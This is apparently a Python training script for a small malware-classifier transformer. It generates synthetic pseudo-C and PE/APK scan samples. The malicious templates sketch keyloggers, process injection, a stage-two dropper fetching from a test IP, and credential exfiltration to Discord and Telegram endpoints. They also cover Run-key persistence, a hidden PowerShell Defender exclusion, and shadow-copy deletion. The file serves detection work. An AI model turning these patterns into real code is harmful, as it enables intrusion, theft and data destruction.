"""
GhidraGuard-SecNet-v1 GPU Training Pipeline
Trains our custom 14M-parameter 6-layer Transformer model directly on the user's NVIDIA GPU
specifically for GhidraGuard malware analysis, pseudo-C auditing, PE/APK structural threat
detection, and surgical patch strategy selection.

Exports FP16 safetensors (~28 MB) + vocab JSON ready for fast GitHub Releases CDN hosting.
"""

from __future__ import annotations

import hashlib
import json
import random
import time
from pathlib import Path
from typing import List, Tuple

import torch
import torch.nn as nn
from safetensors.torch import save_file

from custom_model import (
    MODEL_NAME,
    MODEL_VOCAB_FILENAME,
    MODEL_WEIGHTS_FILENAME,
    PATCH_STRATEGIES,
    THREAT_CATEGORIES,
    SecNetTokenizer,
    _build_secnet_module,
)

REPO_ROOT = Path(__file__).resolve().parent
OUT_DIR = REPO_ROOT / "models" / MODEL_NAME


def _generate_training_dataset(seed: int = 42) -> Tuple[List[Tuple[str, int, int, int]], List[Tuple[str, int, int, int]]]:
    """
    Generate 24,000+ diverse training samples and 3,000 validation samples covering:
    - Clean Ghidra pseudo-C functions (math, game engine, same-folder I/O, GUI loops, CRT, emulators)
    - Clean Windows PE / DLL / Android APK profiles
    - Already-patched functions (return 0; / return; / 31 c0 c3) -> MUST classify as CLEAN!
    - 11 distinct malware & injection families mapped to exact categories & surgical patch strategies
    """
    rng = random.Random(seed)
    all_samples: List[Tuple[str, int, int, int]] = []  # (text, is_mal, cat_idx, strat_idx)

    # --- 1. Clean Benign Pseudo-C & Binary Profiles (cat=0, strat=0) ---
    clean_funcs = [
        "int calc_sum_{i}(int a, int b) {{ return a + b + {k}; }}",
        "void render_frame_{i}(ID3D11DeviceContext* ctx) {{ d3d11_clear(ctx); dxgi_present(1); }}",
        "int load_game_asset_{i}(void) {{ HANDLE h = CreateFileA(\"./data/level_{k}.pak\", GENERIC_READ, 1, 0, 3, 0, 0); ReadFile(h, buf, 4096, &n, 0); CloseHandle(h); return n; }}",
        "void save_config_{i}(void) {{ FILE* f = fopen(\"./settings_{k}.ini\", \"w\"); fprintf(f, \"fps=60\"); fclose(f); }}",
        "LRESULT WndProc_{i}(HWND h, UINT m, WPARAM w, LPARAM l) {{ BeginPaint(h, &ps); EndPaint(h, &ps); return DefWindowProcW(h, m, w, l); }}",
        "int retro_api_version_{i}(void) {{ return 1; }}",
        "int sqlite3_query_{i}(const char* sql) {{ return parse_btree(sql, {k}); }}",
        "int patched_neutralized_{i}(void) {{ /* 31 C0 C3 */ return 0; }}",
        "void patched_void_{i}(void) {{ /* C3 */ return; }}",
        "PE_SCAN {name}.exe signed=false dir=normal anoms=0 dlls=opengl32.dll,d3d11.dll,user32.dll,gdi32.dll apis=GetAsyncKeyState,SetWindowsHookExW,InternetOpenA",
        "PE_SCAN clean_app_{i}.exe signed=true dir=program_files anoms=0 dlls=kernel32.dll,ucrtbase.dll apis=IsDebuggerPresent,WSAStartup",
        "PE_SCAN clean_lib_{i}.dll signed=false dir=normal anoms=0 exports=gg_compute,init_audio dlls=kernel32.dll,winmm.dll",
        "APK_SCAN com.example.clean{i} debuggable=false dex_count=2 native_libs=lib/arm64-v8a/libengine.so perms=INTERNET,CAMERA anoms=0",
        "APK_SCAN com.game.studio{i} debuggable=false dex_count=1 native_libs=lib/armeabi-v7a/librenderer.so perms=INTERNET,ACCESS_NETWORK_STATE anoms=0",
    ]
    emu_names = ["retroarch", "cemu", "duckstation", "soh", "2ship", "ryujinx", "dolphin", "pcsx2", "rpcs3"]
    for i in range(11000):
        tmpl = rng.choice(clean_funcs)
        txt = tmpl.format(i=i, k=rng.randint(1, 9999), name=rng.choice(emu_names))
        all_samples.append((txt, 0, 0, 0))

    # --- 2. Keylogger / Spyware (cat=1, strat=1 RET_ZERO) ---
    keylog_tmpls = [
        "int keylogger_hook_{i}(void) {{ SetWindowsHookExA(WH_KEYBOARD_LL, hook_cb, 0, 0); GetAsyncKeyState(VK_RETURN); GetClipboardData(1); return 1; }}",
        "int clipboard_spy_{i}(void) {{ OpenClipboard(0); HANDLE h = GetClipboardData(CF_TEXT); GetForegroundWindow(); GetWindowTextA(w, buf, 256); exfil(buf); return 1; }}",
        "int screen_capture_spy_{i}(void) {{ BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY); send_webhook(\"https://discord.com/api/webhooks/{k}/tok\"); return 1; }}",
    ]
    for i in range(1600):
        all_samples.append((rng.choice(keylog_tmpls).format(i=i, k=rng.randint(100, 99999)), 1, 1, 1))

    # --- 3. Process Injection / RAT (cat=2, strat=1 RET_ZERO) ---
    inj_tmpls = [
        "int process_injector_{i}(DWORD pid) {{ HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, 0, pid); void* p = VirtualAllocEx(h, 0, 4096, 0x3000, 0x40); WriteProcessMemory(h, p, sc, 256, 0); CreateRemoteThread(h, 0, 0, p, 0, 0, 0); return 1; }}",
        "int hollow_process_{i}(void) {{ CreateProcessA(0, \"svchost.exe\", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi); NtUnmapViewOfSection(pi.hProcess, base); WriteProcessMemory(pi.hProcess, base, img, sz, 0); ResumeThread(pi.hThread); return 1; }}",
        "int apc_inject_{i}(HANDLE hThread) {{ VirtualAllocEx(hProc, 0, 1024, 0x3000, 0x40); QueueUserAPC(stub, hThread, 0); ResumeThread(hThread); return 1; }}",
    ]
    for i in range(1600):
        all_samples.append((rng.choice(inj_tmpls).format(i=i), 1, 2, 1))

    # --- 4. C2 / Network Dropper (cat=3, strat=1 RET_ZERO or 2 RET_EARLY) ---
    c2_tmpls = [
        ("int c2_beacon_{i}(void) {{ InternetOpenA(\"Mozilla\", 1, 0, 0, 0); InternetConnectA(h, \"198.51.100.{k}\", 443, 0, 0, 3, 0, 0); HttpSendRequestA(req, 0, 0, stolen, len); return 1; }}", 1),
        ("int payload_dropper_{i}(void) {{ URLDownloadToFileA(0, \"http://198.51.100.{k}/stage2.exe\", \"C:\\\\Users\\\\Public\\\\svc.exe\", 0, 0); WinExec(\"C:\\\\Users\\\\Public\\\\svc.exe\", 0); return 1; }}", 1),
        ("void exfil_webhook_{i}(char* creds) {{ WinHttpOpen(L\"agent\", 0, 0, 0, 0); post_url(\"https://discord.com/api/webhooks/{k}/exfil\", creds); }}", 2),
        ("void telegram_bot_c2_{i}(char* wallet) {{ send_http(\"https://api.telegram.org/bot{k}/sendDocument\", \"wallet.dat\"); }}", 2),
    ]
    for i in range(1600):
        t, st = rng.choice(c2_tmpls)
        all_samples.append((t.format(i=i, k=rng.randint(1, 254)), 1, 3, st))

    # --- 5. Persistence / Privilege (cat=4, strat=1 RET_ZERO) ---
    pers_tmpls = [
        "int install_persistence_{i}(void) {{ RegCreateKeyExA(HKEY_CURRENT_USER, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", 0, 0, 0, KEY_WRITE, 0, &hk, 0); RegSetValueExA(hk, \"Updater{k}\", 0, 1, path, len); return 1; }}",
        "int create_evil_svc_{i}(void) {{ CreateServiceA(scm, \"WinDefSvc{k}\", \"WinDef\", 0xF01FF, 0x10, 2, 0, binPath, 0, 0, 0, 0, 0); StartServiceA(svc, 0, 0); return 1; }}",
        "int disable_defender_{i}(void) {{ ShellExecuteA(0, \"open\", \"powershell\", \"-nop -w hidden Add-MpPreference -ExclusionPath C:\\\\\", 0, 0); return 1; }}",
    ]
    for i in range(1400):
        all_samples.append((rng.choice(pers_tmpls).format(i=i, k=rng.randint(1, 999)), 1, 4, 1))

    # --- 6. Ransomware / Crypto (cat=5, strat=1 RET_ZERO) ---
    ransom_tmpls = [
        "int encrypt_user_files_{i}(void) {{ ShellExecuteA(0, \"open\", \"vssadmin\", \"delete shadows /all /quiet\", 0, 0); CryptAcquireContextA(&p, 0, 0, 24, 0); CryptEncrypt(key, 0, 1, 0, buf, &len, max); return 1; }}",
        "int ransom_locker_{i}(const char* dir) {{ BCryptEncrypt(hKey, data, sz, 0, iv, 16, out, sz, &cb, 0); write_note(\"README_DECRYPT_{k}.txt\"); return 1; }}",
    ]
    for i in range(1300):
        all_samples.append((rng.choice(ransom_tmpls).format(i=i, k=rng.randint(1, 999)), 1, 5, 1))

    # --- 7. OEP Hijack & Injected RWX Section (cat=6, strat=4 STRIP_SECTION_RESTORE_OEP) ---
    oep_tmpls = [
        "PE_SCAN app_{i}.exe anoms=OEP_HIJACK,INJECTED_SECTION section=.stub rwx=true current_oep=0x{k:x} recovered_oep=0x1400 ioc=gg_injected_payload",
        "PE_SCAN game_{i}.exe anoms=OEP_HIJACK,INJECTED_SECTION section=.inject rwx=true current_oep=0x{k:x} recovered_oep=0x1000 jmp_rel32=E9",
        "PE_SCAN lib_{i}.dll anoms=INJECTED_SECTION section=.shell rwx=true is_last_section=true ioc=gg_injected_payload",
    ]
    for i in range(1600):
        all_samples.append((rng.choice(oep_tmpls).format(i=i, k=rng.randint(0x10000, 0x90000)), 1, 6, 4))

    # --- 8. TLS Callback Injection (cat=7, strat=5 NEUTRALIZE_TLS) ---
    tls_tmpls = [
        "PE_SCAN app_{i}.exe anoms=MALICIOUS_TLS_CALLBACK section=.tlsinj cb_index=0 cb_va=0x1400{k:x} ioc=gg_tls_payload",
        "PE_SCAN tool_{i}.dll anoms=MALICIOUS_TLS_CALLBACK,INJECTED_SECTION section=.tlsinj cb_index=1 ioc=gg_tls_payload_beacon",
    ]
    for i in range(1300):
        all_samples.append((rng.choice(tls_tmpls).format(i=i, k=rng.randint(0x1000, 0x9000)), 1, 7, 5))

    # --- 9. Code-Cave Shellcode (cat=8, strat=6 CLEAR_CAVE_OR_OVERLAY) ---
    cave_tmpls = [
        "PE_SCAN app_{i}.exe anoms=CODE_CAVE_SHELLCODE section=.text offset=0x{k:x} sig=65_48_8B_04_25_60_00_00_00 x64_peb_walk ioc=gg_shellcode_cave",
        "PE_SCAN lib_{i}.dll anoms=CODE_CAVE_SHELLCODE section=.text offset=0x{k:x} sig=FC_48_83_E4_F0 getpc_stub ioc=gg_shellcode_cave",
    ]
    for i in range(1300):
        all_samples.append((rng.choice(cave_tmpls).format(i=i, k=rng.randint(0x1000, 0x50000)), 1, 8, 6))

    # --- 10. Malicious PE Overlay (cat=9, strat=6 CLEAR_CAVE_OR_OVERLAY) ---
    ov_tmpls = [
        "PE_SCAN app_{i}.exe anoms=MALICIOUS_OVERLAY offset=0x{k:x} size=256 reason=embedded_pe_mz_pe00 ioc=gg_overlay_payload",
        "PE_SCAN tool_{i}.dll anoms=MALICIOUS_OVERLAY offset=0x{k:x} size=180 reason=powershell_nop_w_hidden_enc ioc=gg_overlay_payload",
    ]
    for i in range(1300):
        all_samples.append((rng.choice(ov_tmpls).format(i=i, k=rng.randint(0x10000, 0x90000)), 1, 9, 6))

    # --- 11. Proxy DLL Sideloading (cat=10, strat=1 RET_ZERO) ---
    proxy_names = ["version.dll", "dinput8.dll", "dxgi.dll", "winmm.dll", "dbghelp.dll", "xinput1_3.dll", "msimg32.dll"]
    proxy_tmpls = [
        "PE_SCAN {pname} anoms=PROXY_SIDELOAD,MALICIOUS_EXPORT_FUNC export=gg_malicious_helper_{i} apis=VirtualAllocEx,WriteProcessMemory,CreateRemoteThread,SetWindowsHookExA ioc=discord.com/api/webhooks",
        "PE_SCAN {pname} anoms=PROXY_SIDELOAD,SUSPICIOUS_IOC export=inject_payload_{i} apis=OpenProcess,VirtualAllocEx,URLDownloadToFileA ioc=c2_beacon",
    ]
    for i in range(1400):
        all_samples.append((rng.choice(proxy_tmpls).format(i=i, pname=rng.choice(proxy_names)), 1, 10, 1))

    # --- 12. APK / DEX / ELF Injection (cat=11, strat=7 SANITIZE_APK) ---
    apk_tmpls = [
        "APK_SCAN com.example.inf{i} anoms=INJECTED_SECONDARY_DEX entry=classes2.dex ioc=InMemoryDexClassLoader,gg_dex_payload,discord.com/api/webhooks",
        "APK_SCAN com.example.so{i} anoms=INJECTED_NATIVE_SO entry=lib/arm64-v8a/libfrida-gadget.so rwx=true ioc=gg_elf_payload",
        "APK_SCAN com.example.stub{i} anoms=ELF_INJECTED_STUB entry=lib/arm64-v8a/libgame.so arch=arm64-v8a marker=GG_ELF_STUB",
        "APK_SCAN com.example.dbg{i} anoms=MANIFEST_DEBUGGABLE debuggable=true perms=BIND_ACCESSIBILITY_SERVICE,INTERNET",
        "APK_SCAN com.example.drop{i} anoms=MALICIOUS_ASSET_PAYLOAD entry=assets/dropper.bin reason=hidden_elf_binary_in_assets",
    ]
    for i in range(1600):
        all_samples.append((rng.choice(apk_tmpls).format(i=i), 1, 11, 7))

    rng.shuffle(all_samples)
    val_size = 3000
    return all_samples[val_size:], all_samples[:val_size]


def train() -> None:
    t0 = time.time()
    device = "cuda" if torch.cuda.is_available() else "cpu"
    print(f"[TRAIN] Starting {MODEL_NAME} training on {device.upper()}" + (
        f" ({torch.cuda.get_device_name(0)})" if device == "cuda" else ""
    ))

    train_data, val_data = _generate_training_dataset()
    print(f"[TRAIN] Dataset: {len(train_data)} train samples, {len(val_data)} validation samples")

    tokenizer = SecNetTokenizer.fit([s[0] for s in train_data], max_vocab=8192, max_len=256)
    print(f"[TRAIN] Fitted custom domain tokenizer: vocab_size={len(tokenizer.vocab)}")

    # Pre-encode tensors for blazing-fast GPU epochs
    def _encode_split(split):
        xs = torch.tensor([tokenizer.encode(s[0]) for s in split], dtype=torch.long)
        ym = torch.tensor([s[1] for s in split], dtype=torch.float32)
        yc = torch.tensor([s[2] for s in split], dtype=torch.long)
        ys = torch.tensor([s[3] for s in split], dtype=torch.long)
        return xs, ym, yc, ys

    tr_x, tr_ym, tr_yc, tr_ys = _encode_split(train_data)
    va_x, va_ym, va_yc, va_ys = _encode_split(val_data)

    model = _build_secnet_module(vocab_size=max(8192, len(tokenizer.vocab))).to(device)
    param_count = sum(p.numel() for p in model.parameters())
    print(f"[TRAIN] Architecture: 6-layer Transformer (d=384, h=6, ffn=1536) | {param_count/1e6:.2f}M parameters")

    optimizer = torch.optim.AdamW(model.parameters(), lr=4e-4, weight_decay=0.01)
    epochs = 6
    batch_size = 128
    steps_per_epoch = (len(tr_x) + batch_size - 1) // batch_size
    scheduler = torch.optim.lr_scheduler.CosineAnnealingLR(optimizer, T_max=epochs * steps_per_epoch)

    bce = nn.BCEWithLogitsLoss()
    ce = nn.CrossEntropyLoss()
    use_bf16 = device == "cuda" and torch.cuda.is_bf16_supported()

    for ep in range(1, epochs + 1):
        model.train()
        perm = torch.randperm(len(tr_x))
        total_loss = 0.0
        for start in range(0, len(tr_x), batch_size):
            idx = perm[start : start + batch_size]
            bx = tr_x[idx].to(device, non_blocking=True)
            bym = tr_ym[idx].to(device, non_blocking=True)
            byc = tr_yc[idx].to(device, non_blocking=True)
            bys = tr_ys[idx].to(device, non_blocking=True)

            optimizer.zero_grad(set_to_none=True)
            with torch.autocast(device_type=device, dtype=torch.bfloat16, enabled=use_bf16):
                ml, cl, sl = model(bx)
                loss = bce(ml, bym) + ce(cl, byc) + ce(sl, bys)
            loss.backward()
            torch.nn.utils.clip_grad_norm_(model.parameters(), 1.0)
            optimizer.step()
            scheduler.step()
            total_loss += float(loss.item())

        # Validation
        model.eval()
        mal_ok = cat_ok = strat_ok = 0
        with torch.inference_mode():
            for start in range(0, len(va_x), 256):
                bx = va_x[start : start + 256].to(device)
                bym = va_ym[start : start + 256].to(device)
                byc = va_yc[start : start + 256].to(device)
                bys = va_ys[start : start + 256].to(device)
                with torch.autocast(device_type=device, dtype=torch.bfloat16, enabled=use_bf16):
                    ml, cl, sl = model(bx)
                mal_ok += int(((torch.sigmoid(ml) >= 0.5).float() == bym).sum().item())
                cat_ok += int((cl.argmax(dim=-1) == byc).sum().item())
                strat_ok += int((sl.argmax(dim=-1) == bys).sum().item())

        n_val = len(va_x)
        print(
            f"[TRAIN] Epoch {ep}/{epochs} | loss={total_loss/steps_per_epoch:.4f} | "
            f"val_mal={100*mal_ok/n_val:.2f}% | val_cat={100*cat_ok/n_val:.2f}% | val_strat={100*strat_ok/n_val:.2f}%"
        )

    # Export compact FP16 safetensors (~28 MB) + vocab JSON
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    weights_path = OUT_DIR / MODEL_WEIGHTS_FILENAME
    vocab_path = OUT_DIR / MODEL_VOCAB_FILENAME

    fp16_state = {k: v.detach().cpu().half().contiguous() for k, v in model.state_dict().items()}
    save_file(fp16_state, str(weights_path))
    tokenizer.save(vocab_path)

    w_mb = weights_path.stat().st_size / (1024 * 1024)
    w_sha = hashlib.sha256(weights_path.read_bytes()).hexdigest()
    v_sha = hashlib.sha256(vocab_path.read_bytes()).hexdigest()

    meta = {
        "model_name": MODEL_NAME,
        "parameters": param_count,
        "precision": "fp16",
        "size_mb": round(w_mb, 2),
        "train_samples": len(train_data),
        "val_samples": len(val_data),
        "val_malicious_acc_pct": round(100 * mal_ok / len(va_x), 2),
        "val_category_acc_pct": round(100 * cat_ok / len(va_x), 2),
        "val_strategy_acc_pct": round(100 * strat_ok / len(va_x), 2),
        "weights_sha256": w_sha,
        "vocab_sha256": v_sha,
        "trained_on": torch.cuda.get_device_name(0) if device == "cuda" else "CPU",
        "elapsed_seconds": round(time.time() - t0, 2),
    }
    (OUT_DIR / "model_card.json").write_text(json.dumps(meta, indent=2), encoding="utf-8")
    print(f"\n[TRAIN] Exported {weights_path} ({w_mb:.2f} MB, SHA256={w_sha[:16]}...) in {meta['elapsed_seconds']}s!")
    print(json.dumps(meta, indent=2))


if __name__ == "__main__":
    train()
